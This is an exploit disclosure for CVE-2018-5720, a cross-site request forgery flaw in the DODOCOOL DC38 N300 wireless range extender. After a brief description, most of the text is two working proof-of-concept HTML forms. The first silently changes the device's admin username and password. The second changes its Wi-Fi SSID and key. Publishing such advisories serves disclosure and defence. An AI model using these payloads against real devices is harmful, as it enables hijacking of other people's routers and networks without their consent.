# Exploit Title: DODOCOOL DC38 N300 Cross-site Request Forgery
# Date: 17-01-2018
# Exploit Authors: Raffaele Sabato
# Contact: https://twitter.com/syrion89
# Vendor: DODOCOOL
# Vendor Homepage: www.dodocool.com
# Version: RTN2-AW.GD.R3465.1.20161103
# CVE: CVE-2018-5720

I DESCRIPTION
========================================================================

An issue was discovered in DODOCOOL DC38 3-in-1 N300 Mini Wireless Range
Extend RTN2-AW.GD.R3465.1.20161103 devices. A Cross-site request forgery
(CSRF) vulnerability allows remote attackers to hijack the authentication
of users for requests that modify the configuration.
This vulnerability may lead to username and/or password changing, Wi-Fi
password changing, etc.

II PROOF OF CONCEPT
========================================================================

## Change user username and password (test_username:test_password):

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.10.1/boafrm/formPasswordSetup"
method="POST">
      <input type="hidden" name="submit&#45;url"
value="&#47;setok&#46;htm&#63;bw&#61;main&#46;htm" />
      <input type="hidden" name="submit&#45;value" value="" />
      <input type="hidden" name="username" value="test&#95;username" />
      <input type="hidden" name="newpass" value="test&#95;password" />
      <input type="hidden" name="confpass" value="test&#95;password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


## Change WiFi Configuration (WIFI_TEST:TestTest):

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.10.1/boafrm/formWlanSetupREP"
method="POST">
      <input type="hidden" name="submit&#45;url"
value="&#47;setok&#46;htm&#63;bw&#61;wl&#95;rep&#46;htm" />
      <input type="hidden" name="submit&#45;value" value="repset" />
      <input type="hidden" name="wl&#95;onoff" value="0" />
      <input type="hidden"
name="wps&#95;clear&#95;configure&#95;by&#95;reg" value="0" />
      <input type="hidden" name="wlProfileId" value="" />
      <input type="hidden" name="wl&#95;mode" value="0" />
      <input type="hidden" name="wl&#95;authType" value="auto" />
      <input type="hidden" name="wepEnabled" value="ON" />
      <input type="hidden" name="weplength" value="" />
      <input type="hidden" name="wepformat" value="" />
      <input type="hidden" name="wl&#95;wpaAuth" value="psk" />
      <input type="hidden" name="wl&#95;pskFormat" value="0" />
      <input type="hidden" name="wl&#95;pskValue" value="TestTest" />
      <input type="hidden" name="wl&#95;ssid" value="WIFI_TEST" />
      <input type="hidden" name="wl&#95;Method" value="6" />
      <input type="hidden" name="wep&#95;key" value="" />
      <input type="hidden" name="ciphersuite" value="tkip&#43;aes" />
      <input type="hidden" name="ciphersuite" value="aes" />
      <input type="hidden" name="wpa2ciphersuite" value="tkip&#43;aes" />
      <input type="hidden" name="wpa2ciphersuite" value="aes" />
      <input type="hidden" name="web&#95;pskValue" value="TestTest" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>